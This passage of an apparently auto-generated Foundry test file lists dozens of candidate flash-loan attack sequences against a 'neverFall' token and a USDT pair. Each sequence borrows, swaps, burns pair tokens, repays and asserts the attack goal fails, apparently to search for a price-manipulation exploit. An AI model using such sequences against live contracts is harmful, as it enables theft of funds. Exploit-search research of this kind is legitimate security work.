        swap_neverFall_attacker_neverFall_usdt(amt8, amt9);
        payback_usdt_owner(amt10);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand041(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9,
        uint256 amt10
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt10 >= amt0);
        borrow_usdt_owner(amt0);
        swap_pair_attacker_usdt_neverFall(amt1, amt2);
        burn_neverFall_pair(amt3);
        swap_pair_attacker_neverFall_usdt(amt4, amt5);
        swap_neverFall_attacker_usdt_neverFall(amt6, amt7);
        swap_neverFall_attacker_neverFall_usdt(amt8, amt9);
        payback_usdt_owner(amt10);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand042(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt9 >= amt0);
        borrow_usdt_owner(amt0);
        swap_pair_attacker_usdt_neverFall(amt1, amt2);
        swap_neverFall_attacker_neverFall_usdt(amt3, amt4);
        swap_pair_attacker_usdt_neverFall(amt5, amt6);
        swap_pair_attacker_neverFall_usdt(amt7, amt8);
        payback_usdt_owner(amt9);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand043(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9,
        uint256 amt10
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt10 >= amt0);
        borrow_usdt_owner(amt0);
        burn_neverFall_pair(amt1);
        swap_pair_attacker_usdt_neverFall(amt2, amt3);
        swap_neverFall_attacker_neverFall_usdt(amt4, amt5);
        swap_pair_attacker_usdt_neverFall(amt6, amt7);
        swap_pair_attacker_neverFall_usdt(amt8, amt9);
        payback_usdt_owner(amt10);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand044(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9,
        uint256 amt10
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt10 >= amt0);
        borrow_usdt_owner(amt0);
        swap_pair_attacker_usdt_neverFall(amt1, amt2);
        swap_neverFall_attacker_neverFall_usdt(amt3, amt4);
        burn_neverFall_pair(amt5);
        swap_pair_attacker_usdt_neverFall(amt6, amt7);
        swap_pair_attacker_neverFall_usdt(amt8, amt9);
        payback_usdt_owner(amt10);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand045(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9,
        uint256 amt10
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt10 >= amt0);
        borrow_usdt_owner(amt0);
        swap_pair_attacker_usdt_neverFall(amt1, amt2);
        swap_neverFall_attacker_neverFall_usdt(amt3, amt4);
        swap_pair_attacker_usdt_neverFall(amt5, amt6);
        burn_neverFall_pair(amt7);
        swap_pair_attacker_neverFall_usdt(amt8, amt9);
        payback_usdt_owner(amt10);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand046(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt9 >= amt0);
        borrow_usdt_owner(amt0);
        swap_pair_attacker_usdt_neverFall(amt1, amt2);
        swap_neverFall_attacker_neverFall_usdt(amt3, amt4);
        swap_pair_attacker_usdt_neverFall(amt5, amt6);
        swap_neverFall_attacker_neverFall_usdt(amt7, amt8);
        payback_usdt_owner(amt9);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand047(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9,
        uint256 amt10
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt10 >= amt0);
        borrow_usdt_owner(amt0);
        burn_neverFall_pair(amt1);
        swap_pair_attacker_usdt_neverFall(amt2, amt3);
        swap_neverFall_attacker_neverFall_usdt(amt4, amt5);
        swap_pair_attacker_usdt_neverFall(amt6, amt7);
        swap_neverFall_attacker_neverFall_usdt(amt8, amt9);
        payback_usdt_owner(amt10);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand048(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9,
        uint256 amt10
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt10 >= amt0);
        borrow_usdt_owner(amt0);
        swap_pair_attacker_usdt_neverFall(amt1, amt2);
        swap_neverFall_attacker_neverFall_usdt(amt3, amt4);
        burn_neverFall_pair(amt5);
        swap_pair_attacker_usdt_neverFall(amt6, amt7);
        swap_neverFall_attacker_neverFall_usdt(amt8, amt9);
        payback_usdt_owner(amt10);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand049(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9,
        uint256 amt10,
        uint256 amt11
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt11 >= amt0);
        borrow_usdt_owner(amt0);
        swap_pair_attacker_usdt_neverFall(amt1, amt2);
        swap_neverFall_attacker_neverFall_usdt(amt3, amt4);
        swap_pair_attacker_usdt_neverFall(amt5, amt6);
        swap_neverFall_attacker_neverFall_usdt(amt7, amt8);
        swap_pair_attacker_neverFall_usdt(amt9, amt10);
        payback_usdt_owner(amt11);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand050(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt9 >= amt0);
        borrow_usdt_owner(amt0);
        swap_pair_attacker_usdt_neverFall(amt1, amt2);
        swap_neverFall_attacker_neverFall_usdt(amt3, amt4);
        swap_neverFall_attacker_usdt_neverFall(amt5, amt6);
        swap_pair_attacker_neverFall_usdt(amt7, amt8);
        payback_usdt_owner(amt9);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand051(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9,
        uint256 amt10
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt10 >= amt0);
        borrow_usdt_owner(amt0);
        burn_neverFall_pair(amt1);
        swap_pair_attacker_usdt_neverFall(amt2, amt3);
        swap_neverFall_attacker_neverFall_usdt(amt4, amt5);
        swap_neverFall_attacker_usdt_neverFall(amt6, amt7);
        swap_pair_attacker_neverFall_usdt(amt8, amt9);
        payback_usdt_owner(amt10);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand052(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9,
        uint256 amt10
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt10 >= amt0);
        borrow_usdt_owner(amt0);
        swap_pair_attacker_usdt_neverFall(amt1, amt2);
        swap_neverFall_attacker_neverFall_usdt(amt3, amt4);
        swap_neverFall_attacker_usdt_neverFall(amt5, amt6);
        burn_neverFall_pair(amt7);
        swap_pair_attacker_neverFall_usdt(amt8, amt9);
        payback_usdt_owner(amt10);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand053(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt9 >= amt0);
        borrow_usdt_owner(amt0);
        swap_pair_attacker_usdt_neverFall(amt1, amt2);
        swap_neverFall_attacker_neverFall_usdt(amt3, amt4);
        swap_neverFall_attacker_usdt_neverFall(amt5, amt6);
        swap_neverFall_attacker_neverFall_usdt(amt7, amt8);
        payback_usdt_owner(amt9);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand054(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9,
        uint256 amt10
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt10 >= amt0);
        borrow_usdt_owner(amt0);
        burn_neverFall_pair(amt1);
        swap_pair_attacker_usdt_neverFall(amt2, amt3);
        swap_neverFall_attacker_neverFall_usdt(amt4, amt5);
        swap_neverFall_attacker_usdt_neverFall(amt6, amt7);
        swap_neverFall_attacker_neverFall_usdt(amt8, amt9);
        payback_usdt_owner(amt10);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand055(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9,
        uint256 amt10,
        uint256 amt11
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt11 >= amt0);
        borrow_usdt_owner(amt0);
        swap_pair_attacker_usdt_neverFall(amt1, amt2);
        swap_neverFall_attacker_neverFall_usdt(amt3, amt4);
        swap_neverFall_attacker_usdt_neverFall(amt5, amt6);
        swap_neverFall_attacker_neverFall_usdt(amt7, amt8);
        swap_pair_attacker_neverFall_usdt(amt9, amt10);
        payback_usdt_owner(amt11);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand056(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt9 >= amt0);
        borrow_usdt_owner(amt0);
        swap_neverFall_attacker_usdt_neverFall(amt1, amt2);
        swap_pair_attacker_neverFall_usdt(amt3, amt4);
        swap_pair_attacker_usdt_neverFall(amt5, amt6);
        swap_pair_attacker_neverFall_usdt(amt7, amt8);
        payback_usdt_owner(amt9);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand057(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9,
        uint256 amt10
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt10 >= amt0);
        borrow_usdt_owner(amt0);
        swap_neverFall_attacker_usdt_neverFall(amt1, amt2);
        burn_neverFall_pair(amt3);
        swap_pair_attacker_neverFall_usdt(amt4, amt5);
        swap_pair_attacker_usdt_neverFall(amt6, amt7);
        swap_pair_attacker_neverFall_usdt(amt8, amt9);
        payback_usdt_owner(amt10);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand058(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9,
        uint256 amt10
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt10 >= amt0);
        borrow_usdt_owner(amt0);
        swap_neverFall_attacker_usdt_neverFall(amt1, amt2);
        swap_pair_attacker_neverFall_usdt(amt3, amt4);
        burn_neverFall_pair(amt5);
        swap_pair_attacker_usdt_neverFall(amt6, amt7);
        swap_pair_attacker_neverFall_usdt(amt8, amt9);
        payback_usdt_owner(amt10);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand059(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9,
        uint256 amt10
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt10 >= amt0);
        borrow_usdt_owner(amt0);
        swap_neverFall_attacker_usdt_neverFall(amt1, amt2);
        swap_pair_attacker_neverFall_usdt(amt3, amt4);
        swap_pair_attacker_usdt_neverFall(amt5, amt6);
        burn_neverFall_pair(amt7);
        swap_pair_attacker_neverFall_usdt(amt8, amt9);
        payback_usdt_owner(amt10);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand060(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9,
        uint256 amt10,
        uint256 amt11
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt11 >= amt0);
        borrow_usdt_owner(amt0);
        swap_neverFall_attacker_usdt_neverFall(amt1, amt2);
        swap_pair_attacker_neverFall_usdt(amt3, amt4);
        swap_pair_attacker_usdt_neverFall(amt5, amt6);
        swap_pair_attacker_neverFall_usdt(amt7, amt8);
        swap_neverFall_attacker_neverFall_usdt(amt9, amt10);
        payback_usdt_owner(amt11);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand061(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt9 >= amt0);
        borrow_usdt_owner(amt0);
        swap_neverFall_attacker_usdt_neverFall(amt1, amt2);
        swap_pair_attacker_neverFall_usdt(amt3, amt4);
        swap_pair_attacker_usdt_neverFall(amt5, amt6);
        swap_neverFall_attacker_neverFall_usdt(amt7, amt8);
        payback_usdt_owner(amt9);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand062(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9,
        uint256 amt10
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt10 >= amt0);
        borrow_usdt_owner(amt0);
        swap_neverFall_attacker_usdt_neverFall(amt1, amt2);
        burn_neverFall_pair(amt3);
        swap_pair_attacker_neverFall_usdt(amt4, amt5);
        swap_pair_attacker_usdt_neverFall(amt6, amt7);
        swap_neverFall_attacker_neverFall_usdt(amt8, amt9);
        payback_usdt_owner(amt10);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand063(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9,
        uint256 amt10
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt10 >= amt0);
        borrow_usdt_owner(amt0);
        swap_neverFall_attacker_usdt_neverFall(amt1, amt2);
        swap_pair_attacker_neverFall_usdt(amt3, amt4);
        burn_neverFall_pair(amt5);
        swap_pair_attacker_usdt_neverFall(amt6, amt7);
        swap_neverFall_attacker_neverFall_usdt(amt8, amt9);
        payback_usdt_owner(amt10);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand064(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt9 >= amt0);
        borrow_usdt_owner(amt0);
        swap_neverFall_attacker_usdt_neverFall(amt1, amt2);
        swap_pair_attacker_neverFall_usdt(amt3, amt4);
        swap_neverFall_attacker_usdt_neverFall(amt5, amt6);
        swap_pair_attacker_neverFall_usdt(amt7, amt8);
        payback_usdt_owner(amt9);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand065(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9,
        uint256 amt10
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt10 >= amt0);
        borrow_usdt_owner(amt0);
        swap_neverFall_attacker_usdt_neverFall(amt1, amt2);
        burn_neverFall_pair(amt3);
        swap_pair_attacker_neverFall_usdt(amt4, amt5);
        swap_neverFall_attacker_usdt_neverFall(amt6, amt7);
        swap_pair_attacker_neverFall_usdt(amt8, amt9);
        payback_usdt_owner(amt10);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand066(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9,
        uint256 amt10
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt10 >= amt0);
        borrow_usdt_owner(amt0);
        swap_neverFall_attacker_usdt_neverFall(amt1, amt2);
        swap_pair_attacker_neverFall_usdt(amt3, amt4);
        swap_neverFall_attacker_usdt_neverFall(amt5, amt6);
        burn_neverFall_pair(amt7);
        swap_pair_attacker_neverFall_usdt(amt8, amt9);
        payback_usdt_owner(amt10);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand067(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9,
        uint256 amt10,
        uint256 amt11
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt11 >= amt0);
        borrow_usdt_owner(amt0);
        swap_neverFall_attacker_usdt_neverFall(amt1, amt2);
        swap_pair_attacker_neverFall_usdt(amt3, amt4);
        swap_neverFall_attacker_usdt_neverFall(amt5, amt6);
        swap_pair_attacker_neverFall_usdt(amt7, amt8);
        swap_neverFall_attacker_neverFall_usdt(amt9, amt10);
        payback_usdt_owner(amt11);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand068(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt9 >= amt0);
        borrow_usdt_owner(amt0);
        swap_neverFall_attacker_usdt_neverFall(amt1, amt2);
        swap_pair_attacker_neverFall_usdt(amt3, amt4);
        swap_neverFall_attacker_usdt_neverFall(amt5, amt6);
        swap_neverFall_attacker_neverFall_usdt(amt7, amt8);
        payback_usdt_owner(amt9);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand069(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9,
        uint256 amt10
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt10 >= amt0);
        borrow_usdt_owner(amt0);
        swap_neverFall_attacker_usdt_neverFall(amt1, amt2);
        burn_neverFall_pair(amt3);
        swap_pair_attacker_neverFall_usdt(amt4, amt5);
        swap_neverFall_attacker_usdt_neverFall(amt6, amt7);
        swap_neverFall_attacker_neverFall_usdt(amt8, amt9);
        payback_usdt_owner(amt10);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand070(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt9 >= amt0);
        borrow_usdt_owner(amt0);
        swap_neverFall_attacker_usdt_neverFall(amt1, amt2);
        swap_neverFall_attacker_neverFall_usdt(amt3, amt4);
        swap_pair_attacker_usdt_neverFall(amt5, amt6);
        swap_pair_attacker_neverFall_usdt(amt7, amt8);
        payback_usdt_owner(amt9);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand071(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9,
        uint256 amt10
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt10 >= amt0);
        borrow_usdt_owner(amt0);
        swap_neverFall_attacker_usdt_neverFall(amt1, amt2);
        swap_neverFall_attacker_neverFall_usdt(amt3, amt4);
        burn_neverFall_pair(amt5);
        swap_pair_attacker_usdt_neverFall(amt6, amt7);
        swap_pair_attacker_neverFall_usdt(amt8, amt9);
        payback_usdt_owner(amt10);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand072(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9,
        uint256 amt10
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt10 >= amt0);
        borrow_usdt_owner(amt0);
        swap_neverFall_attacker_usdt_neverFall(amt1, amt2);
        swap_neverFall_attacker_neverFall_usdt(amt3, amt4);
        swap_pair_attacker_usdt_neverFall(amt5, amt6);
        burn_neverFall_pair(amt7);
        swap_pair_attacker_neverFall_usdt(amt8, amt9);
        payback_usdt_owner(amt10);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand073(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt9 >= amt0);
        borrow_usdt_owner(amt0);
        swap_neverFall_attacker_usdt_neverFall(amt1, amt2);
        swap_neverFall_attacker_neverFall_usdt(amt3, amt4);
        swap_pair_attacker_usdt_neverFall(amt5, amt6);
        swap_neverFall_attacker_neverFall_usdt(amt7, amt8);
        payback_usdt_owner(amt9);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand074(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9,
        uint256 amt10
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt10 >= amt0);
        borrow_usdt_owner(amt0);
        swap_neverFall_attacker_usdt_neverFall(amt1, amt2);
        swap_neverFall_attacker_neverFall_usdt(amt3, amt4);
        burn_neverFall_pair(amt5);
        swap_pair_attacker_usdt_neverFall(amt6, amt7);
        swap_neverFall_attacker_neverFall_usdt(amt8, amt9);
        payback_usdt_owner(amt10);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand075(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9,
        uint256 amt10,
        uint256 amt11
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt11 >= amt0);
        borrow_usdt_owner(amt0);
        swap_neverFall_attacker_usdt_neverFall(amt1, amt2);
        swap_neverFall_attacker_neverFall_usdt(amt3, amt4);
        swap_pair_attacker_usdt_neverFall(amt5, amt6);
        swap_neverFall_attacker_neverFall_usdt(amt7, amt8);
        swap_pair_attacker_neverFall_usdt(amt9, amt10);
        payback_usdt_owner(amt11);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand076(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt9 >= amt0);
        borrow_usdt_owner(amt0);
        swap_neverFall_attacker_usdt_neverFall(amt1, amt2);
        swap_neverFall_attacker_neverFall_usdt(amt3, amt4);
        swap_neverFall_attacker_usdt_neverFall(amt5, amt6);
        swap_pair_attacker_neverFall_usdt(amt7, amt8);
        payback_usdt_owner(amt9);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand077(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9,
        uint256 amt10
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt10 >= amt0);
        borrow_usdt_owner(amt0);
        swap_neverFall_attacker_usdt_neverFall(amt1, amt2);
        swap_neverFall_attacker_neverFall_usdt(amt3, amt4);
        swap_neverFall_attacker_usdt_neverFall(amt5, amt6);
        burn_neverFall_pair(amt7);
        swap_pair_attacker_neverFall_usdt(amt8, amt9);
        payback_usdt_owner(amt10);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand078(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt9 >= amt0);
        borrow_usdt_owner(amt0);
        swap_neverFall_attacker_usdt_neverFall(amt1, amt2);
        swap_neverFall_attacker_neverFall_usdt(amt3, amt4);
        swap_neverFall_attacker_usdt_neverFall(amt5, amt6);
        swap_neverFall_attacker_neverFall_usdt(amt7, amt8);
        payback_usdt_owner(amt9);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand079(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9,
        uint256 amt10,
        uint256 amt11
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt11 >= amt0);
        borrow_usdt_owner(amt0);
        swap_neverFall_attacker_usdt_neverFall(amt1, amt2);
        swap_neverFall_attacker_neverFall_usdt(amt3, amt4);
        swap_neverFall_attacker_usdt_neverFall(amt5, amt6);
        swap_neverFall_attacker_neverFall_usdt(amt7, amt8);
        swap_pair_attacker_neverFall_usdt(amt9, amt10);
        payback_usdt_owner(amt11);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand080(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt9 >= amt0);
        borrow_neverFall_owner(amt0);
        swap_pair_attacker_neverFall_usdt(amt1, amt2);
        swap_pair_attacker_usdt_neverFall(amt3, amt4);
        swap_pair_attacker_neverFall_usdt(amt5, amt6);
        swap_pair_attacker_usdt_neverFall(amt7, amt8);
        payback_neverFall_owner(amt9);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand081(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9,
        uint256 amt10
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt10 >= amt0);
        borrow_neverFall_owner(amt0);
        burn_neverFall_pair(amt1);
        swap_pair_attacker_neverFall_usdt(amt2, amt3);
        swap_pair_attacker_usdt_neverFall(amt4, amt5);
        swap_pair_attacker_neverFall_usdt(amt6, amt7);
        swap_pair_attacker_usdt_neverFall(amt8, amt9);
        payback_neverFall_owner(amt10);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand082(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9,
        uint256 amt10
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt10 >= amt0);
        borrow_neverFall_owner(amt0);
        swap_pair_attacker_neverFall_usdt(amt1, amt2);
        burn_neverFall_pair(amt3);
        swap_pair_attacker_usdt_neverFall(amt4, amt5);
        swap_pair_attacker_neverFall_usdt(amt6, amt7);
        swap_pair_attacker_usdt_neverFall(amt8, amt9);
        payback_neverFall_owner(amt10);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand083(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9,
        uint256 amt10
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt10 >= amt0);
        borrow_neverFall_owner(amt0);
        swap_pair_attacker_neverFall_usdt(amt1, amt2);
        swap_pair_attacker_usdt_neverFall(amt3, amt4);
        burn_neverFall_pair(amt5);
        swap_pair_attacker_neverFall_usdt(amt6, amt7);
        swap_pair_attacker_usdt_neverFall(amt8, amt9);
        payback_neverFall_owner(amt10);
        assert(!attackGoal());
        vm.stopPrank();
    }

